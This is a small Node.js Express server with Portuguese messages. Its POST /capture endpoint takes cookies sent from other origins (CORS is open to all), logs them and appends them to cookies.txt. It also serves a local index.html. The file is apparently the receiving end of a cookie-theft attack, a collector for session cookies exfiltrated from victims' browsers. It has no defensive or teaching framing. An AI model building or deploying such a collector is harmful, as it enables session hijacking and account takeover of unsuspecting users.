const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const app = express();
const port = 3000;
const path = require('path');
app.use(cors());

app.use(bodyParser.json());

app.post('/capture', (req, res) => {
    const cookies = req.body.cookies;
    console.log('Cookies recebidos:', cookies);

    fs.appendFile('cookies.txt', cookies + '\n', (err) => {
        if (err) {
            console.error('Erro ao salvar cookies:', err);
            res.status(500).json({ status: 'Erro ao capturar cookies!' });
        } else {
            res.json({ status: 'Cookies capturados com sucesso!' });
        }
    });
});
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
});
